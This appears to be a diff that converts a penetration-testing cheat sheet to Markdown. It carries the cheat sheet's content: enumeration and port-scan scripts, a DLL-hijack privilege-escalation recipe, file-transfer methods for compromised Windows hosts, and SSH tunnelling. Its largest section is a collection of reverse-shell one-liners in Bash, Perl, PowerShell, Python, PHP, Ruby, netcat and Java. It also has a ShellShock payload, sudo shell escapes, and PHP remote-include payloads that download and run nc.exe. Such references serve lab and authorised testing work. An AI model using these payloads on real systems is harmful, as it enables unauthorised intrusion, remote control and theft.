@@ -1,24 +1,25 @@
-[]{#anchor}Pentesting Notes
+Enumeration
+===========
 
-[]{#anchor-1}Enumeration
+Banner Grabs
+------------
 
-[]{#anchor-2}Banner Grabs
-
-[]{#anchor-3}Using telnet
+### Using telnet
 
   -----------------------------------------------
   telnet **\<target IP/FQDN\> \<target port\>**
   -----------------------------------------------
 
-[]{#anchor-4}Using nc
+### Using nc
 
   ----------------------------------------------
   nc -v **\<target IP/FQDN\> \<target port\>**
   ----------------------------------------------
 
-[]{#anchor-5}HTTP Style Enumeration
+HTTP Style Enumeration
+----------------------
 
-[]{#anchor-6}Get Server Options (telnet, nc)
+### Get Server Options (telnet, nc)
 
 +----------------------------------------------------------------+
 | telnet **\<target IP/FQDN\> \<target port\>**                  |
@@ -32,7 +33,7 @@
 | User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1) |
 +----------------------------------------------------------------+
 
-[]{#anchor-7}Get Headers (telnet, nc)
+### Get Headers (telnet, nc)
 
 +----------------------------------------------------------------+
 | telnet **\<target IP/FQDN\> \<target port\>**                  |
@@ -46,7 +47,7 @@
 | User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1) |
 +----------------------------------------------------------------+
 
-[]{#anchor-8}Get Full Page Content (telnet, nc)
+### Get Full Page Content (telnet, nc)
 
 +----------------------------------------------------------------+
 | nc -v **\<target IP/FQDN\> \<target port\>**                   |
@@ -60,21 +61,21 @@
 | User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1) |
 +----------------------------------------------------------------+
 
-[]{#anchor-9}
+###  
 
-[]{#anchor-10}Use Curl to Get HTTP OPTIONS Response
+### Use Curl to Get HTTP OPTIONS Response
 
   -------------------------------------------
   curl -I -X OPTIONS **\<target IP/FQDN\>**
   -------------------------------------------
 
-[]{#anchor-11}Use Curl to Get HTTP HEAD Response
+### Use Curl to Get HTTP HEAD Response
 
   ----------------------------------------
   curl -I -X HEAD **\<target IP/FQDN\>**
   ----------------------------------------
 
-[]{#anchor-12}Use Invoke-WebRequest to Get HTTP OPTIONS Response
+### Use Invoke-WebRequest to Get HTTP OPTIONS Response
 
 +-----------------------------------------------------------------------+
 | \[Net.ServicePointManager\]::SecurityProtocol = \"tls12, tls11, tls,  |
@@ -84,7 +85,7 @@
 | OPTIONS).RawContent                                                   |
 +-----------------------------------------------------------------------+
 
-[]{#anchor-13}Use Invoke-WebRequest to Get HTTP HEAD Response
+### Use Invoke-WebRequest to Get HTTP HEAD Response
 
 +-----------------------------------------------------------------------+
 | \[Net.ServicePointManager\]::SecurityProtocol = \"tls12, tls11, tls,  |
@@ -94,7 +95,8 @@
 | HEAD).RawContent                                                      |
 +-----------------------------------------------------------------------+
 
-[]{#anchor-14}Privilege Escalation
+Privilege Escalation
+====================
 
 Some basic notes/thoughts on gaining privilege escalation:
 
@@ -118,23 +120,28 @@ Some basic notes/thoughts on gaining privilege escalation:
     -   Locate services or other programs that attempt to load missing
         > DLLs or this could be combined with a path order error.
 
-[]{#anchor-15}IKEEXT Service Missing DLL Privileged Execution
+IKEEXT Service Missing DLL Privileged Execution
+-----------------------------------------------
 
 1.  Look for a path that in the %PATH% variable that your user is able
-    to write to.
+    > to write to.
+
 2.  Create a msfvenom payload using the DLL format option.
+
 3.  Place the DLL into the path you located and rename it to:
 
     -   **Wlbsctrl.dll**
 
 4.  Wait for a restart or trigger a restart of the IKEET service
-    somehow.
+    > somehow.
 
-[]{#anchor-16}Scanning
+Scanning
+========
 
-[]{#anchor-17}NMap
+NMap
+----
 
-[]{#anchor-18}Host Scan
+### Host Scan
 
 Scans systems and reports a list of hosts that it finds up.
 
@@ -142,7 +149,7 @@ Scans systems and reports a list of hosts that it finds up.
   nmap -sP 172.28.128.0/24
   --------------------------
 
-[]{#anchor-19}Basic TCP Scan
+### Basic TCP Scan
 
 Scan ports 1 through 65535 with timing set to 5, OS detection On,
 Verbos, and TCP connect.
@@ -151,7 +158,7 @@ Verbos, and TCP connect.
   nmap -p 1-65535 -T5 -A -v -sT 192.168.57.101
   ----------------------------------------------
 
-[]{#anchor-20}Less Noisy SYN Scan
+### Less Noisy SYN Scan
 
 Scan ports 1 through 1024 with timing set to 0, OS detection On, Verbos,
 and SYN Only.
@@ -160,7 +167,7 @@ and SYN Only.
   nmap -p 1-1024 -T0 -A -v -sS 192.168.57.101
   ---------------------------------------------
 
-[]{#anchor-21}Scan a Service for Vulnerabilities Using NSE
+### Scan a Service for Vulnerabilities Using NSE
 
 Scan the hosts contained in the file for vulnerabilities that match the
 given ls filter.
@@ -169,7 +176,8 @@ given ls filter.
   for vuln in \$(ls /usr/share/nmap/scripts/**\<filename mask\>**\*); do nmap -p 80 \--open -iL **\<hostfile\>** \--script \$vuln \>\> **\<outputfile\>**; done
   ---------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-[]{#anchor-22}Quick 'n Dirty Bash Ping Sweep
+Quick 'n Dirty Bash Ping Sweep
+------------------------------
 
 Scan the entire 10.11.1/24 network
 
@@ -183,7 +191,8 @@ Scan the entire 10.11.1/24 network
 
   ----------------------------------------------------------------------------------------------------------------
 
-[]{#anchor-23}Python Ping Sweep with Multi-Threading (Linux)
+Python Ping Sweep with Multi-Threading (Linux)
+----------------------------------------------
 
 Scan the entire 10.11.1/24 network
 
@@ -222,7 +231,8 @@ Scan the entire 10.11.1/24 network
 
   ------------------------------------------------------------------------------------------------------------------
 
-[]{#anchor-24}Python Ping Sweep with Multi-Threading (Windows)
+Python Ping Sweep with Multi-Threading (Windows)
+------------------------------------------------
 
 +------------------------------------------------------------------------+
 | import multiprocessing                                                 |
@@ -272,7 +282,8 @@ Scan the entire 10.11.1/24 network
 | pool.join()                                                            |
 +------------------------------------------------------------------------+
 
-[]{#anchor-25}Python Port Scan
+Python Port Scan
+----------------
 
   -------------------------------------------------------------------------------------------------
   \#!/usr/bin/env python\
@@ -331,7 +342,8 @@ Scan the entire 10.11.1/24 network
 
   -------------------------------------------------------------------------------------------------
 
-[]{#anchor-26}Python Port Scanner (Multi-Threaded)
+Python Port Scanner (Multi-Threaded)
+------------------------------------
 
 +-----------------------------------------------------------------------+
 | \#!/usr/bin/env python                                                |
@@ -442,41 +454,48 @@ Scan the entire 10.11.1/24 network
 | print \'Scanning Completed in: \', total                              |
 +-----------------------------------------------------------------------+
 
-[]{#anchor-27}PowerShell Port Scan
+PowerShell Port Scan
+--------------------
 
   -------------------------------------------------------------------------------------------------------------------------------
   1..1024 \| % { echo ((New-Object Net.Sockets.TcpClient).Connect(\"**\<ip address\>**\", \$\_)) \"\$\_ is open\" } 2\>Out-Null
   -------------------------------------------------------------------------------------------------------------------------------
 
-[]{#anchor-28}GoBuster (Web Common Folder Scan)
+GoBuster (Web Common Folder Scan)
+---------------------------------
 
   ------------------------------------------------------------------------------------------------------------------------
   gobuster -u **\<url\>** -w /usr/share/seclists/Discovery/Web\_Content/common.txt -s \'200,204,301,302,307,403,500\' -e
   ------------------------------------------------------------------------------------------------------------------------
 
-[]{#anchor-29}GoBuster (Web Common CGI Scan)
+GoBuster (Web Common CGI Scan)
+------------------------------
 
   ----------------------------------------------------------------------------------------------------------------------
   gobuster -u **\<url\>** -w /usr/share/seclists/Discovery/Web\_Content/cgis.txt -s \'200,204,301,302,307,403,500\' -e
   ----------------------------------------------------------------------------------------------------------------------
 
-[]{#anchor-30}Pivoting
+Pivoting
+========
 
-[]{#anchor-31}SSH Reverse Proxy
+SSH Reverse Proxy
+-----------------
 
-+---------------------------------------------------------------------+
-| From remote system (behind firewall):                               |
-|                                                                     |
-| ssh -R 8888:localhost:22 **\<local\_user\>**@**\<local\_machine\>** |
-|                                                                     |
-| From local system:                                                  |
-|                                                                     |
-| ssh -D 8181 **\<remote\_user\>**\@localhost -p 8888                 |
-+---------------------------------------------------------------------+
++-----------------------------------------------------------------------+
+| From remote system (behind firewall):                                 |
+|                                                                       |
+| > ssh -R 8888:localhost:22 **\<local\_user\>**@**\<local\_machine\>** |
+|                                                                       |
+| From local system:                                                    |
+|                                                                       |
+| > ssh -D 8181 **\<remote\_user\>**\@localhost -p 8888                 |
++-----------------------------------------------------------------------+
 
-[]{#anchor-32}Ncat Fu
+Ncat Fu
+=======
 
-[]{#anchor-33}Send Connection/Banner Grab
+Send Connection/Banner Grab
+---------------------------
 
 Grab the banner from the specified SMTP server
 
@@ -484,95 +503,101 @@ Grab the banner from the specified SMTP server
   ncat -nv \<ip address\> \<port\>
   ----------------------------------
 
-[]{#anchor-34}Files
+Files
+=====
 
-[]{#anchor-35}Locating Files
+Locating Files
+--------------
 
-[]{#anchor-36}Locate files with setuid bits (\*nix)
+### Locate files with setuid bits (\*nix)
 
   -----------------------------------------------------
   find / -perm 4000 -o perm 2000 -exec ls -ldb {} \\;
   -----------------------------------------------------
 
-[]{#anchor-37}Locate files belonging to a user (\*nix)
+### Locate files belonging to a user (\*nix)
 
-[]{#anchor-38}Version 1
+#### Version 1
 
   ------------------------------------
   find -u \<username\> 2\> /dev/null
   ------------------------------------
 
-[]{#anchor-39}Version 2
+#### Version 2
 
   ---------------------------------------
   find -user \<username\> 2\> /dev/null
   ---------------------------------------
 
-[]{#anchor-40}Locate files belonging to a group (\*nix)
+### Locate files belonging to a group (\*nix)
 
-[]{#anchor-41}Version 1
+#### Version 1
 
   -------------------------------------
   find -g \<groupname\> 2\> /dev/null
   -------------------------------------
 
-[]{#anchor-42}Version 2
+#### Version 2
 
   -----------------------------------------
   find -group \<groupname\> 2\> /dev/null
   -----------------------------------------
 
-[]{#anchor-43}Locate files that are world writable (\*nix)
+### Locate files that are world writable (\*nix)
 
   --------------------------------------------------
   find / -perm -2 ! -type l -ls -xdev 2\>/dev/null
   --------------------------------------------------
 
-[]{#anchor-44}Locate Files with Weak Permissions (Windows)
+### Locate Files with Weak Permissions (Windows)
 
-See [*accesschk.exe*](#_z7kt47j1y476) section
+See [[accesschk.exe]{.underline}](#accesschk.exe-sysinternals) section
 
-[]{#anchor-45}Locate Credential Files (Windows)
+### Locate Credential Files (Windows)
 
   ---------------------------------------------------------
   dir /S **\[\*pass\*\|\*cred\*\|\*vnc\*\|\*.config\*\]**
   ---------------------------------------------------------
 
-[]{#anchor-46}Locate Files Containing \<String\>
+### Locate Files Containing \<String\>
 
   -----------------------------------------------------------
   findstr /SI **\<string\>** **\[\*.xml\|\*.ini\|\*.txt\]**
   -----------------------------------------------------------
 
-[]{#anchor-47}Locate Files & Folders Accessible to Root Only
+### Locate Files & Folders Accessible to Root Only
 
   -------------------------------------------------------------
   find **\<path\>** -user root -perm +400 ! -perm +044 -print
   -------------------------------------------------------------
 
-[]{#anchor-48}Transfer Files
+Transfer Files
+==============
 
-[]{#anchor-49}Transfer Files Using NetCat (nc)
+Transfer Files Using NetCat (nc)
+--------------------------------
 
-[]{#anchor-50}Receiving
+### Receiving
 
   -------------------------------------------
   nc -l -p **\<port\>** \> **\<filename\>**
   -------------------------------------------
 
-[]{#anchor-51}Sending
+### Sending
 
   -----------------------------------------------------
   nc **\<address\>** **\<port\>** \< **\<filename\>**
   -----------------------------------------------------
 
-[]{#anchor-52}TFTP (from reverse Windows shell)
+TFTP (from reverse Windows shell)
+---------------------------------
 
   ---------------------------------------------
   tftp **\<ipaddress\>** GET **\<filename\>**
   ---------------------------------------------
 
-[]{#anchor-53}FTP (from reverse Windows shell)
+FTP (from reverse Windows shell)
+--------------------------------
 
 +-------------------------------------------+
 | echo open **\<ipaddress\>** 21\> ftp.txt\ |
@@ -582,11 +607,11 @@ See [*accesschk.exe*](#_z7kt47j1y476) section
 | echo GET **\<filename\>** \>\> ftp.txt\   |
 | echo bye \>\> ftp.txt                     |
 |                                           |
-| \                                         |
 | ftp --v -n -s:ftp.txt                     |
 +-------------------------------------------+
 
-[]{#anchor-54}VBScript (from reverse Windows shell)
+VBScript (from reverse Windows shell)
+-------------------------------------
 
 Usage: cscript http://**\<ipaddress\>**/**\<file\>**
 **\<localfilename\>**
@@ -620,7 +645,8 @@ Usage: cscript http://**\<ipaddress\>**/**\<file\>**
 
   -------------------------------------------------------------------------------------------------
 
-[]{#anchor-55}Invoke-WebRequest (from reverse Windows shell)
+Invoke-WebRequest (from reverse Windows shell)
+----------------------------------------------
 
 Requires PowerShell v3.0 or higher. Relies on IE. May not work on
 Windows Server.
@@ -629,8 +655,8 @@ Windows Server.
   PS C:\\\> Invoke-WebRequest -Uri **\<URI\>** -OutFile **\<dest\_filename\>** -UserAgent **\<useragentstring\>**
   -----------------------------------------------------------------------------------------------------------------
 
-[]{#anchor-56}PowerShell System.Net.WebClient (from reverse Windows
-shell)
+PowerShell System.Net.WebClient (from reverse Windows shell)
+------------------------------------------------------------
 
 **NOTE:** Use only valid URLs and File Names or you will hang the shell.
 Can be re-used by specifying -url and -file arguments.
@@ -642,7 +668,8 @@ Can be re-used by specifying -url and -file arguments.
 
   --------------------------------------------------------------------------------------------------------
 
-[]{#anchor-57}PowerShell BITS Transfer (from reverse Windows shell)
+PowerShell BITS Transfer (from reverse Windows shell)
+-----------------------------------------------------
 
 **NOTE:** Use only valid URLs and File Names or you will hang the shell.
 
@@ -659,7 +686,8 @@ Can be re-used by specifying -url and -file arguments.
 | bitsget.ps1                                                           |
 +-----------------------------------------------------------------------+
 
-[]{#anchor-58}Python Download Echo Script (Windows)
+Python Download Echo Script (Windows)
+-------------------------------------
 
   --------------------------------------------------------------------------------------------------------
   echo import urllib \> download.py\
@@ -668,7 +696,8 @@ Can be re-used by specifying -url and -file arguments.
 
   --------------------------------------------------------------------------------------------------------
 
-[]{#anchor-59}Debug (from reverse Windows shell)
+Debug (from reverse Windows shell)
+----------------------------------
 
 This method has size limitations. It will only work with 64k or smaller
 files.
@@ -686,13 +715,15 @@ files.
 | reverse shell                                                         |
 +-----------------------------------------------------------------------+
 
-[]{#anchor-60}Copy Command (Share Access)
+Copy Command (Share Access)
+---------------------------
 
   ---------------------------------------------
   copy \\\\**\<source\>** **\<destination\>**
   ---------------------------------------------
 
-[]{#anchor-61}Echo Command (Share Access)
+Echo Command (Share Access)
+---------------------------
 
   -------------------------------------------------------------
   echo "**\<base64 encoded data\>**" \>\> **\<destination\>**
@@ -702,7 +733,8 @@ files.
 that can be echoed to the remote system. It can then be decoded using
 the **certutil.exe** command.
 
-[]{#anchor-62}PHP Remote Include FTP Download Script
+PHP Remote Include FTP Download Script
+--------------------------------------
 
 +-----------------------------------------------------------------------+
 | \<?php                                                                |
@@ -732,46 +764,54 @@ the **certutil.exe** command.
 | ?\>                                                                   |
 +-----------------------------------------------------------------------+
 
-[]{#anchor-63}Tunneling
+Tunneling
+=========
 
-[]{#anchor-64}SSH Tunnels
+SSH Tunnels
+-----------
 
-[]{#anchor-65}SSH Remote Port Forwarding
+### SSH Remote Port Forwarding
 
   ------------------------------------------------------------------------------------------
   ssh **\<gateway\>** -R **\<remote port to bind\>**:**\<local host\>**:**\<local port\>**
   ------------------------------------------------------------------------------------------
 
 -   **\<gateway\>** = The Hostname/IP of the machine you are working
-    from.
--   **\<localhost\>** = The local IP of the machine that you have a
-    shell open on. I.e. 127.0.0.1
--   **\<remote port to bind\>** = The local port of the machine that you
-    have a shell open on. This is the port that you will connect to.
--   **\<local port\>** = The port that the service you want to connect
-    to is running.
+    > from.
 
-**EXAMPLE: **ssh 10.0.0.20 -R 3390:127.0.0.1:3389
+-   **\<localhost\>** = The local IP of the machine that you have a
+    > shell open on. I.e. 127.0.0.1
+
+-   **\<remote port to bind\>** = The local port of the machine that you
+    > have a shell open on. This is the port that you will connect to.
+
+-   **\<local port\>** = The port that the service you want to connect
+    > to is running.
+
+**EXAMPLE:** ssh 10.0.0.20 -R 3390:127.0.0.1:3389
 
 In the above example, this command is being run from the compromised
 system. You are connecting back to your working machine. 127.0.0.1:3390
 on your working machine is now connected to port 3389 on the compromised
 system.
 
-[]{#anchor-66}SSH Local Port Forwarding
+### SSH Local Port Forwarding
 
   ---------------------------------------------------------------------------------------------
   ssh **\<gateway\>** -L **\<local port to listen\>**:**\<remote host\>**:**\<remote port\>**
   ---------------------------------------------------------------------------------------------
 
 -   **\<gateway\>** = The Hostname/IP of the machine you are working
-    from.
+    > from.
+
 -   **\<remote host\>** = The IP address of the server you would like to
-    redirect traffic to.
+    > redirect traffic to.
+
 -   **\<local port to listen\>** = The local port of the machine that
-    you have a shell open on.
+    > you have a shell open on.
+
 -   **\<remote port\>** = The port on the remote server that you would
-    like to redirect traffic to.
+    > like to redirect traffic to.
 
 **EXAMPLE:** ssh 10.0.0.20 -L 8080:11.11.11.11:80
 
@@ -779,92 +819,94 @@ In the above example, this command is being run from the compromised
 system. You are attempting to forward traffic on the compromised system
 from 127.0.0.1:8080 to the remote web server hosted on 11.11.11.11:80.
 
-[]{#anchor-67}Reverse Shells
+Reverse Shells
+==============
 
-[*http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet*](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+[[http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet]{.underline}](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 
-[]{#anchor-68}One-Liners
+One-Liners
+----------
 
 Try substituting "cmd.exe" instead of "/bin/sh" or "/bin/bash" to make
 these work in Windows.
 
 Try the following command separators: ;, &&, \|, \|\|
 
-[]{#anchor-69}Bash v1
+### Bash v1
 
   ------------------------------------------
   bash -i \>& /dev/tcp/10.0.0.1/8080 0\>&1
   ------------------------------------------
 
-[]{#anchor-70}Bash v1.5
+### Bash v1.5
 
   --------------------------------------------------------
   bash -c \'bash -i \>& /dev/tcp/\<ip\>/\<port\> 0\>&1\'
   --------------------------------------------------------
 
-[]{#anchor-71}Bash v2
+### Bash v2
 
   ---------------------------------------------------------------------------------------------------
   bash -c \'exec 5\<\>/dev/tcp/\<ip\>/\<port\>; while read line 0\<&5; do \$line 2\>&5 \>&5; done\'
   ---------------------------------------------------------------------------------------------------
 
-[]{#anchor-72}Bash v3
+### Bash v3
 
   ---------------------------------------------------------------------------------------------------------
   bash -c \'exec 5\<\>/dev/tcp/\<ip\>/\<port\>; cat \<&5 \| while read line; do \$line 2\>&5 \>&5; done\'
   ---------------------------------------------------------------------------------------------------------
 
-[]{#anchor-73}URL Encoded
+#### URL Encoded
 
   -------------------------------------------------------------------------------------------------
   bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F**\<address\>**%2F**\<port\>**%200%3E%261%27
   -------------------------------------------------------------------------------------------------
 
-[]{#anchor-74}Perl
+### Perl
 
   ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
   perl -e \'use Socket;\$i=\"10.0.0.1\";\$p=1234;socket(S,PF\_INET,SOCK\_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr\_in(\$p,inet\_aton(\$i)))){open(STDIN,\"\>&S\");open(STDOUT,\"\>&S\");open(STDERR,\"\>&S\");exec(\"/bin/sh -i\");};\'
   ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-[]{#anchor-75}PowerShell
+### PowerShell
 
   ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
   \$client = New-Object System.Net.Sockets.TCPClient(\'**\<IP\_Address\>**\',**\<port\>**);\$stream = \$client.GetStream();\[byte\[\]\]\$bytes = 0..65535\|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2\>&1 \| Out-String );\$sendback2 = \$sendback + \'PS \' + (pwd).Path + \'\> \';\$sendbyte = (\[text.encoding\]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};
   ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-[]{#anchor-76}Python
+### Python
 
   ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
   python -c \'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\[\"/bin/sh\",\"-i\"\]);\'
   ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-[]{#anchor-77}PHP
+### PHP
 
   --------------------------------------------------------------------------------------
   php -r \'\$sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i \<&3 \>&3 2\>&3\");\'
   --------------------------------------------------------------------------------------
 
-[]{#anchor-78}Ruby
+### Ruby
 
   ---------------------------------------------------------------------------------------------------------------------
   ruby -rsocket -e\'f=TCPSocket.open(\"10.0.0.1\",1234).to\_i;exec sprintf(\"/bin/sh -i \<&%d \>&%d 2\>&%d\",f,f,f)\'
   ---------------------------------------------------------------------------------------------------------------------
 
-[]{#anchor-79}Netcat
+### Netcat
 
-[]{#anchor-80}Version 1
+#### Version 1
 
   -----------------------------
   nc -e /bin/sh 10.0.0.1 1234
   -----------------------------
 
-[]{#anchor-81}Version 2
+#### Version 2
 
   ---------------------------------------------------------------------------------
   rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2\>&1\|nc 10.0.0.1 1234 \>/tmp/f
   ---------------------------------------------------------------------------------
 
-[]{#anchor-82}Java
+#### Java
 
   ----------------------------------------------------------------------------------------------------------------------------------------------------
   r = Runtime.getRuntime()\
@@ -873,15 +915,16 @@ Try the following command separators: ;, &&, \|, \|\|
 
   ----------------------------------------------------------------------------------------------------------------------------------------------------
 
-[]{#anchor-83}ShellShock Reverse Shells
+ShellShock Reverse Shells
+-------------------------
 
-[]{#anchor-84}Curl - One-Liner
+### Curl - One-Liner
 
   -------------------------------------------------------------------------------------------------------------------------------
   curl -A \"() { :;}; echo \'Content-type: text/html\'; echo; /bin/ls -al /home/bynarr;\" http://192.168.56.101:591/cgi-bin/cat
   -------------------------------------------------------------------------------------------------------------------------------
 
-[]{#anchor-85}Python Reverse Shell - ShellShock w/Sudo
+### Python Reverse Shell - ShellShock w/Sudo
 
 +-----------------------------------------------------------------------+
 | import requests,sys                                                   |
@@ -912,9 +955,10 @@ Try the following command separators: ;, &&, \|, \|\|
 | headers=headers).text.strip()                                         |
 +-----------------------------------------------------------------------+
 
-[]{#anchor-86}Python Reverse Shells
+Python Reverse Shells
+---------------------
 
-[]{#anchor-87}Straight Python Shell
+### Straight Python Shell
 
   --------------------------------------------------------
   import socket,os\
@@ -931,7 +975,7 @@ Try the following command separators: ;, &&, \|, \|\|
 
   --------------------------------------------------------
 
-[]{#anchor-88}Encode a Python Script (Base64)
+### Encode a Python Script (Base64)
 
   ----------------------------------------------------
   import base64\
@@ -942,7 +986,7 @@ Try the following command separators: ;, &&, \|, \|\|
 
   ----------------------------------------------------
 
-[]{#anchor-89}Decode an Encoded Python Script (Base64)
+### Decode an Encoded Python Script (Base64)
 
 +--------------------------------------------------------+
 | import base64;                                         |
@@ -956,9 +1000,10 @@ Try the following command separators: ;, &&, \|, \|\|
 | f.close()                                              |
 +--------------------------------------------------------+
 
-[]{#anchor-90}Fix TTY Issues In Reverse Shells
+Fix TTY Issues In Reverse Shells
+--------------------------------
 
-[]{#anchor-91}Python PTY
+### Python PTY
 
 +----------------------------------------------------+
 | python -c \'import pty; pty.spawn(\"/bin/bash\")\' |
@@ -974,14 +1019,14 @@ Try the following command separators: ;, &&, \|, \|\|
 | clear                                              |
 +----------------------------------------------------+
 
-[]{#anchor-92}Python Sudo w/o TTY
+### Python Sudo w/o TTY
 
   -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
   python -c \'import pty,subprocess,os,time;(master,slave)=pty.openpty();p=subprocess.Popen(\[\"/bin/su\",\"-c\",\"id\",\"bynarr\"\],stdin=slave,stdout=slave,stderr=slave);os.read(master,1024);os.write(master,\"fruity\\n\");time.sleep(0.1);print os.read(master,1024);\'
   -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-[]{#anchor-93}RDP Via Plink Tunnel
-([*https://www.chiark.greenend.org.uk/\~sgtatham/putty/latest.html*](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html))
+RDP Via Plink Tunnel ([[https://www.chiark.greenend.org.uk/\~sgtatham/putty/latest.html]{.underline}](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html))
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 From Remote/Compromised Host
 
@@ -989,9 +1034,11 @@ From Remote/Compromised Host
   plink.exe \<user\>@\<ip or domain\> -pw \<password\> -P 22 -2 -4 -T -N -C -R 0.0.0.0:12345:127.0.0.1:3389
   -----------------------------------------------------------------------------------------------------------
 
-[]{#anchor-94}Shell Escapes (Linux w/sudo)
+Shell Escapes (Linux w/sudo)
+============================
 
-[]{#anchor-95}vi(m)
+vi(m)
+-----
 
   ------
   :!sh
@@ -1001,34 +1048,39 @@ From Remote/Compromised Host
   :set shell=/bin/bash:shell
   ----------------------------
 
-[]{#anchor-96}nmap \--interactive
+nmap \--interactive
+-------------------
 
   -----
   !sh
   -----
 
-[]{#anchor-97}awk
+awk
+---
 
   -------------------------------------------
   awk \'BEGIN {system(\\\"/bin/bash\\\")}\'
   -------------------------------------------
 
-[]{#anchor-98}perl
+perl
+----
 
   -------------------------------------
   perl -e \'exec \\\"/bin/bash\\\";\'
   -------------------------------------
 
-[]{#anchor-99}find
+find
+----
 
   -----------------------------------------------------------------------
   find / -exec /usr/bin/awk \'BEGIN {system(\\\"/bin/bash\\\")}\' \\\\;
   -----------------------------------------------------------------------
 
-[]{#anchor-100}X Server Hacks
+X Server Hacks
+==============
 
-[]{#anchor-101}How to Run An Application As An Unprivileged User (i.e.
-WireShark)
+How to Run An Application As An Unprivileged User (i.e. WireShark)
+------------------------------------------------------------------
 
 This script will allow you to run an application as an unprivileged user
 
@@ -1041,12 +1093,14 @@ This script will allow you to run an application as an unprivileged user
 |                                                 |
 | \# Run the desired X app as the specified user  |
 |                                                 |
-| sudo -u** \<username\> \<command and args\>**   |
+| sudo -u **\<username\> \<command and args\>**   |
 +-------------------------------------------------+
 
-[]{#anchor-102}Kali Hacks
+Kali Hacks
+==========
 
-[]{#anchor-103}Configure Wireshark to Run As a Non-Privileged User
+Configure Wireshark to Run As a Non-Privileged User
+---------------------------------------------------
 
 These steps will create a group called wireshark that will be granted
 permission to run WireShark. You will need to add a standard user to the
@@ -1063,7 +1117,8 @@ system and make them a member of the group.
 | /usr/bin/dumpcap                                                      |
 +-----------------------------------------------------------------------+
 
-[]{#anchor-104}Configure Pure-FTP to Serve Files
+Configure Pure-FTP to Serve Files
+---------------------------------
 
 This script will create a user and group for pure-ftp as well restart
 the service.
@@ -1071,7 +1126,6 @@ the service.
 +---------------------------------------------------+
 | \#!/bin/bash                                      |
 |                                                   |
-| \                                                 |
 | groupadd ftpgroup\                                |
 | useradd -g ftpgroup -d /dev/null -s /etc ftpuser\ |
 | pure-pw useradd offsec -u ftpuser -d /ftphome\    |
@@ -1083,9 +1137,11 @@ the service.
 | /etc/init.d/pure-ftpd restart                     |
 +---------------------------------------------------+
 
-[]{#anchor-105}Useful Scripts
+Useful Scripts
+==============
 
-[]{#anchor-106}Pull the Google Hacking Database (GHDB) Into a CSV File
+Pull the Google Hacking Database (GHDB) Into a CSV File
+-------------------------------------------------------
 
 This will pull the GHDB down into a CSV file. You will need to replace
 any "&quote;" and "&amp;" with regular characters. Perhaps I'll add that
@@ -1125,7 +1181,8 @@ scripted.
 | done                                                                  |
 +-----------------------------------------------------------------------+
 
-[]{#anchor-107}Zone Transfer (Bash)
+Zone Transfer (Bash)
+--------------------
 
 This script will locate the NS servers and attempt to use the "host"
 command to perform a zone transfer.
@@ -1150,7 +1207,8 @@ command to perform a zone transfer.
 | fi                                                                    |
 +-----------------------------------------------------------------------+
 
-[]{#anchor-108}PHP RFI Reverse Shell
+PHP RFI Reverse Shell
+---------------------
 
 This can be used in a RFI/LFI to download nc.exe from the specified
 server then run it.
@@ -1172,82 +1230,89 @@ Using exec() to change directories and run a file uploaded elsewhere.
   \<?php exec(\'cd uploads && nc.exe -nv **\<server\> \<port\>** -e cmd.exe\');?\>
   ----------------------------------------------------------------------------------
 
-[]{#anchor-109}Type Juggling
+Type Juggling
+=============
 
-[]{#anchor-110}PHP Loose Comparison
+PHP Loose Comparison
+--------------------
 
--   [*https://www.php.net/manual/en/types.comparisons.php*](https://www.php.net/manual/en/types.comparisons.php)
+-   [[https://www.php.net/manual/en/types.comparisons.php]{.underline}](https://www.php.net/manual/en/types.comparisons.php)
 
-[]{#anchor-111}PHP String Conversions
+PHP String Conversions
+----------------------
 
 PHP duplicated the string conversion method used by Unix\'s strtod
 command. Using this type of string conversion with Loose comparisons
 could lead to type juggling.
 
--   [*https://www.php.net/manual/en/language.types.string.php\#language.types.string.conversion*](https://www.php.net/manual/en/language.types.string.php#language.types.string.conversion)
--   [*http://manpages.ubuntu.com/manpages/bionic/pt/man3/strtod.3.html*](http://manpages.ubuntu.com/manpages/bionic/pt/man3/strtod.3.html)
+-   [[https://www.php.net/manual/en/language.types.string.php\#language.types.string.conversion]{.underline}](https://www.php.net/manual/en/language.types.string.php#language.types.string.conversion)
 
-[]{#anchor-112}SQL Injection
